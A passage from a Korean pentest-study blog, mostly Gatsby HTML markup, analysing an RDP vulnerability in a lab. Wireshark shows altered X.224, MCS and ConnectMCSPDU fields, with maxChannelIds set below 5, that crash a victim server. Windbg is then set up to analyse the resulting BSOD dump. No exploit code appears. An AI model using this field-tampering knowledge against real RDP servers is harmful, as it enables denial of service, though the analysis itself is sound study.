3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 분석</h2>\n<h3 id=\"wireshark-동적-분석\" style=\"position:relative;\"><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"wireshark 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wireshark 동적 분석</h3>\n<p><strong>1. 세션 수립 과정</strong></p>\n<p>TCP 3-way Handshake 과정을 통해 클라이언트와 서버 사이의 세션을\n수립한다. 클라이언트 측에서 SYN 패킷을 보낼 때 기존에 사용하던 임시\n포트를 재사용하였다는 것을 TCP Port numbers reused 메시지를 통해 확인\n가능하다. 서버로부터 SYN, ACK 패킷을 받을 때 이전의 세그먼트를 확인하지\n못하고 패킷 손실이 발생했지만 클라이언트에서는 해당 응답을 받고 세션이\n수립됐다.</p>\n<p>![](./image39.png</p>\n<p><strong>2. 페이로드 전송 과정</strong></p>\n<p>RDP 연결 요청 부분의 X.224, TPKT 헤더의 바이트 값이 수정되어 서버 측으로\n전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABbUlEQVQoz03PW4/aMBCG4fz/X1RVe9WLdnfBTgJVKTnYDjSxE0IIhEPZlrwV3hb1k0bjGY0eyUEkpojJK+F0ShTHyFAylYIwCgmlRErBLI6YLzLULKaYRahQUMxivk8lmXjFZSnWWSprCZYvArdIceGceu2wK4tdVTT1lmZ7oG57Nt3AIrfor3OKUFJEIatZTC5DjBRsjOZ4GjgcDgQfniQfnyJfn75kPIuCzxNDOFGIpEMst4ikR3wrybUiNwW5Npj1mlxrklzRtC2n04nj8UjQtBtWK8O2a7lczjxyGvg/RdmSZRlaKbI0RWvte5ok1M55bL/fE2RKUZUlVVWx2+04n89cLj/53e0Yx5HbbfSg+dGSpqlHPay1n5fLJXVdMwyDryDJMpxztG3L9Xr9i9wY+x7G0c/3qPU7mOf5A7z3JEmw1tJ1nTeC+5EtSxrn+PX25hFuN+h7j/0DK/f+ZaWUR40x/n3fNU3zAP8AnsoBvacl4bgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image40\"\n        title=\"image40\"\n        src=\"/static/4277c735251ea66859591fef929bd348/d8f62/image40.png\"\n        srcset=\"/static/4277c735251ea66859591fef929bd348/e9ff0/image40.png 180w,\n/static/4277c735251ea66859591fef929bd348/f21e7/image40.png 360w,\n/static/4277c735251ea66859591fef929bd348/d8f62/image40.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>부분</p>\n<p>Client MCS Attach User Request PDU 헤더의 바이트 값이 수정되어 서버\n측으로 전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAzElEQVQI1x3G0U6DMBQGYN7/fbwyuzAKFbIbM81sm3YFIhsUGODGKDs7v4nf1Re9PAk8bz7w+iYRJxri3XAsDESsOEvNI/nylOxqSj4b2qsDGa1ISUnOWjJak1aSTtUPTdNE3rcU9fkBZVWiaY7ougYhzKDHyhRm4DICYACE9b7CfCu4NIXLMpTbLWyawQgBryT68xm+bRHVSqHIC/hTja7xuF2vHJYF4ffCS9fzst45hJXn28x54VhJyVpKdtay0fr/x6ricRx5GAb+A2LN2u7pvvNWAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image41\"\n        title=\"image41\"\n        src=\"/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png\"\n        srcset=\"/static/3ad0292170c4c918dbb0993deb58a1b1/e9ff0/image41.png 180w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/f21e7/image41.png 360w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Request PDU 바이트 변조 부분</p>\n<p>T.125 ConnectMCSPDU 패킷의 maxChannelids 필드 부분이 5보다 작은 값으로\n설정되어 전송하게 되어 버그가 발생하는 부분과 동일하다. 전체적인 패킷\n바이트 변조를 서버 측으로 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABn0lEQVQozz2N2W7iMABF8/+/VKAq3QQituMk2LEd70vihAAq1XSkqTSiD706um9Hp+Dvu/bhgazXx/WGPj62qxXfbsX2mWw27Wol397066us2zDk4AfvkrMxhjEPc/BjUVYYNk1Z4apt247BpsFH0tCu7dj9WX9UQQmG34EWVGsuexqj9SnFZAuMKwgOoDxUCPacGa2cNXMeT1NeppzzRLhxHLS7Fy9BsJVTYBpECCL5pkjTpToy1uuYl/Pt78fX9y+3r+/rn39cmmhx9JW3lTfIKZAHvkwieVzUND+9tPsnJLAlfKHdTLqZ0OkOmTo+W2u8rZ2C3qBf+ZTFEOrCHPZss2abdd7vrgieIbggeGvqz7b5bOobPVqjnamdhsHcy1aBcWBz5tHhYl/CssI1pYQLoQ1TWhjj0uDH0Y9jGLO1JtjaGxjsvew1zIOYRx4sKgCAFUI1xpSQXgjBuRQiep9iTDEOKVlrZN/JnmrFlOykIMGb8zmf5lSUJUAIEUIYY1LKvu+llM45/7MQgjaaMc4Yl1JxIRjnzrnL5bosy387uNHrnyMyQgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image42\"\n        title=\"image42\"\n        src=\"/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png\"\n        srcset=\"/static/e0afbea813524ce703ff9801e5943464/e9ff0/image42.png 180w,\n/static/e0afbea813524ce703ff9801e5943464/f21e7/image42.png 360w,\n/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ConnectMCSPDU 패킷을 전송한후 5.4.2 장의 RDP 연결 과정을 수행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABK0lEQVQY01WQ607CQBSEef8XU2CvbbUX2XPOdrctqICh2xYxBlNAQpP5O5lvvpmOK6Gc1D55WRdv+6XAvNghBqJORVWUNAAtYY/YEfVN/btZn++ZSe2EckK6KG7yYr9gJsu3iB1iJ5TXUYXYWRosDUS99z/vm4eyUI5xYoJ0VGf57nlh0uwT4IAYmLRSO4BA1AMExM6702Q5Smqlvbphf3FBRbEj6ol6FVVxUl/LF5bg3PekzGW54LjkJHWVZtun+eo1/QBoDQQmrFR+xLb/2O60bs73zHRcy0dhHPN8FHb57HRUgzkgdgDBQOvK6bLSnstSyPIqbM7gJgyC1E7HNVFflkdrB7KD99PPUnkmLLuUR2FLSPMtwDjFZSm1L4q9gWBMu1odrD0+Yv8BRXqn4eF5mvgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image43\"\n        title=\"image43\"\n        src=\"/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png\"\n        srcset=\"/static/1fade8e821b53c8ee407cf76befb9577/e9ff0/image43.png 180w,\n/static/1fade8e821b53c8ee407cf76befb9577/f21e7/image43.png 360w,\n/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"windbg-동적-분석\" style=\"position:relative;\"><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"windbg 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windbg 동적 분석</h3>\n<p><strong>1. 서버측 BSOD 분석</strong></p>\n<p>피해자 서버에서 발생한 BSOD 메모리 덤프를 통해 어느 부분에서 예외가\n발생하였는지 확인한다. 그림 4‑4장에서 설치한 BlueScreenView를 통해 오류\n메시지와 예외 함수 주소 값을 확인한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACXUlEQVQoz4XP3UtTcRgH8J+6kGSiCE1Wl14VgrfZH1CX+ZZGF11UqOXwDcN0lS4ym91YiIGVXqWkmVTDo27qWTtnL2fL952XOY9nhjqpmN30xs75xnQXEkkPfHj4feF5eH6EoZcJNT4lezweuFlGpWdpsAwDn9cLxvUBDOMCwzDg/H6IAg+eXwHPByGKAiRJQGhVRCgkxkWRhygsU2Ssb8zinnHH1oIS5lif9pH1Yd7NYcHjxxI3v8fv8kKYD0IOithci0DmQ4hIa/gUkhFeEbAZjqjSYhDhRSFMbG+ccDgDYDlJm3T4MDkTwOQ0h/cUA4dzAaxPhIOew6xrCTaKgSewCmrKiwk7h2nnAmwTLBifCBvFarP0HAhHB7AdVQCoWnRrHdHtDUSjEcgyj2+7OwB+I/Z1G79+7iKyLiJRO1sKvuxs4Mf3GCKKBEDDhiJpsc9REJHm7nS22WLtt8bRVDOi3TSNoqF6GDVXBtFQPYIm0xjqq0bQeGMUpqtDaK57h9rKV6irHEbj9dcwXRtCc+1bterySzx/7FglAIjR2CUfM1hhND5Sc3IeIiElxQJCWpJak8zJt/mvrDWeyE+d7KbIubM9Gfn5T5S8vG4YDFbVkNuVWIysrAdIS7MgNfWg9n9mOt29OCF3cabwqYOcON6WnptrVbKzO6HXd6h6fQcyMzuQcfQ+dLr9gf/RpVn2Fhae7rUT3ZGWdELMyv7pZjXZD3H7MHtfLijosZNLZdb0ovO9SnHJM5SV9qulxQMoKRpAeVk/KspfoOLCAeXJ7C8XK/rjJUV9aKgftP8BVTzs4OodzX8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image44\"\n        title=\"image44\"\n        src=\"/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png\"\n        srcset=\"/static/8a5fcf682c083e508949317424bf0e4c/e9ff0/image44.png 180w,\n/static/8a5fcf682c083e508949317424bf0e4c/f21e7/image44.png 360w,\n/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">  <span class=\"token operator\">**</span>덤프 파일명<span class=\"token operator\">**</span>   <span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01.</span>dmp        <span class=\"token operator\">**</span>발생 날짜<span class=\"token operator\">**</span>   <span class=\"token number\">6</span><span class=\"token operator\">/</span><span class=\"token number\">10</span><span class=\"token operator\">/</span><span class=\"token number\">2020</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">37</span> PM\n  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>\n  <span class=\"token operator\">**</span>예외 문자열<span class=\"token operator\">**</span>   SYSTEM_SERVICE_EXCEPTION   <span class=\"token operator\">**</span>예외 코드<span class=\"token operator\">**</span>   <span class=\"token number\">0x0000003b</span>\n  <span class=\"token operator\">**</span>파라미터<span class=\"token operator\">**</span>      <span class=\"token number\">00000000</span><span class=\"token operator\">-</span>c0000005                          \n                    <span class=\"token operator\">**</span>fffff880<span class=\"token operator\">-</span>011c9722<span class=\"token operator\">**</span>                      \n                    fffff880<span class=\"token operator\">-</span>0cad81f0                          </code></pre></div>\n<p><strong>2. BSOD 메모리 덤프 파일 분석 환경</strong></p>\n<p>windbg를 통해 분석하기 위해 그림 4‑1장에서 구성한 대상 서버에서 발생한\n메모리 덤프를 분석하고 자하는 로컬 환경으로 가져온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABmklEQVQozz2R2Y7aMBRAQwl9mz5OFohjEm8x3h0gCYnoVExRCxL9/68ZxaCeJ18dH1uyo6E/ZFma5+sfb2+LxWK5XMaBbzPzuFqt4jhePsU8f4/j1TIQWbefpsn7VmvTNE1Zlh8fvy6XC8bYGHv5aa/XT0rZ3+vvP9crQqg/fx67rqq2AIBIKkkZc9ZppTnnjDEppRSy4VxKqZW0zmKEKSXj1Blj/P7o25YxVpZllGdrZxtrJZp3UBQQQjRNQwgmhHK+C2sipdxut3meAwA2m01RFFFV4xKANE3qunbOUUoxxnVdw4DWeidEVVVCCIIxhJCQ2ZaBSBxGgur390Qp9Xg8pnHs+945GyxsAy7gvQNFQRmzdrYQwujYD5v1Os0yqfT9fj+dTv9jWELv59JaG3I7x5Qao1/x+TzWVZ2mqVL6drsNw3DsOqP182bftt5760JsQ8yoNeYV951DiGRZJoR4PP4Nw9APQ+v9M94HnHNtOKUoCsaYc+4VdweRZeskSTjn4zgqrZSe/yxYuNvtni/PAyUACKNg5/gL+kVdEo+7fYkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image45\"\n        title=\"image45\"\n        src=\"/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png\"\n        srcset=\"/static/47770b923dc6d6375b473138999651c5/e9ff0/image45.png 180w,\n/static/47770b923dc6d6375b473138999651c5/f21e7/image45.png 360w,\n/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. windbg 심볼 설정</strong></p>\n<p>메모리 덤프파일이 빌드 될 때 생성되는 디버깅 정보파일을 불러오기 위해\n해당 심볼을 설정한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.777777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAkElEQVQI143JQQ7CIBQEUBIXBmiwi1KaYMU0paL9YNpjmOr9bzMGjK5dvMxkhil1gFIVdDfiuj4RlgduGS24JwJFAlFESgkxxtI/6Gees7lg4+gx+QH9sML4Fzq/4Rg22NOEcDnDuR7WWjjnYIxB0zTQWhe5t21b9px1XYMJIcC5gBR7VHwH+SV42fP/Lykl3pevTthqhC52AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image46\"\n        title=\"image46\"\n        src=\"/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png\"\n        srcset=\"/static/782b49255a296da15c591e7685f3e0e6/e9ff0/image46.png 180w,\n/static/782b49255a296da15c591e7685f3e0e6/f21e7/image46.png 360w,\n/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span>\\\\windbg<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>y srv\\<span class=\"token operator\">*</span>c<span class=\"token operator\">:</span>\\\\symbols\\<span class=\"token operator\">*</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//msdl.microsoft.com/download/symbols</span>\n     <span class=\"token operator\">-</span>z D<span class=\"token operator\">:</span>\\\\STUDY\\\\PenTest_Study\\\\Project\\\\Day4_5\\\\report\\\\bluescreen_dmp\\\\<span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01.</span>dmp</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>옵션<span class=\"token operator\">**</span>          <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>y SymbolPath<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 경로 지정 및 다중 경로는 세미콜론 구분 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>z DumFile<span class=\"token operator\">**</span>    <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   메모리 덤프 파일 이름 지정                  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span 